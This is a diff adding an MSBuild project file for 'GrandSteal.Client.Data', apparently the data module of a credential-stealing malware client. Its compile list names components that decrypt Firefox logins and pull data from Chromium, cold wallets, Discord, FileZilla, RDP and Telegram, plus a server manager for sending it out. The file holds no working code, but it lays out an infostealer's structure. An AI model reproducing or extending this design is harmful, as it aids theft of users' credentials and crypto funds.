@@ -1,0 +1,102 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{AD7265E6-965F-48E7-8BE8-11F155EEE471}</ProjectGuid>
+    <OutputType>Library</OutputType>
+    <RootNamespace>GrandSteal.Client.Data</RootNamespace>
+    <AssemblyName>GrandSteal.Client.Data</AssemblyName>
+    <TargetFrameworkVersion>v2.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="CredentialManagement" />
+    <Reference Include="GrandSteal.Client.Models">
+      <HintPath>..\..\GrandSteal.Client.Models.dll</HintPath>
+    </Reference>
+    <Reference Include="GrandSteal.SharedModels">
+      <HintPath>..\..\GrandSteal.SharedModels.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="protobuf-net">
+      <HintPath>..\..\protobuf-net.dll</HintPath>
+    </Reference>
+    <Reference Include="SuperSocket.ClientEngine">
+      <HintPath>..\..\SuperSocket.ClientEngine.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Xml" />
+    <Reference Include="WebSocket4Net">
+      <HintPath>..\..\WebSocket4Net.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="-Module-.cs" />
+    <Compile Include="ConfusedByAttribute.cs" />
+    <Compile Include="Firefox\Asn1Der.cs" />
+    <Compile Include="Firefox\Asn1DerObject.cs" />
+    <Compile Include="Firefox\BerkeleyDB.cs" />
+    <Compile Include="Firefox\ByteHelper.cs" />
+    <Compile Include="Firefox\LoginJson.cs" />
+    <Compile Include="Firefox\MozillaPBE.cs" />
+    <Compile Include="Firefox\PasswordCheck.cs" />
+    <Compile Include="Firefox\RootLogin.cs" />
+    <Compile Include="Firefox\TripleDESHelper.cs" />
+    <Compile Include="Helpers\SetupManager.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Recovery\ChromiumManager.cs" />
+    <Compile Include="Recovery\ColdWalletManager.cs" />
+    <Compile Include="Recovery\DesktopFileManager.cs" />
+    <Compile Include="Recovery\DiscordManager.cs" />
+    <Compile Include="Recovery\FileZillaManager.cs" />
+    <Compile Include="Recovery\FirefoxBase.cs" />
+    <Compile Include="Recovery\RdpManager.cs" />
+    <Compile Include="Recovery\TelegramManager.cs" />
+    <Compile Include="Server\RequestsExtensions.cs" />
+    <Compile Include="Server\ResponseHandler.cs" />
+    <Compile Include="Server\ServerManager.cs" />
+    <Compile Include="SetupStorage.cs" />
+    <Compile Include="SetupStorage.Designer.cs">
+      <DependentUpon>SetupStorage.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="SQLite\DataRow.cs" />
+    <Compile Include="SQLite\FieldHeader.cs" />
+    <Compile Include="SQLite\MasterEntry.cs" />
+    <Compile Include="SQLite\SQLiteManager.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="SetupStorage.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>SetupStorage.Designer.cs</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
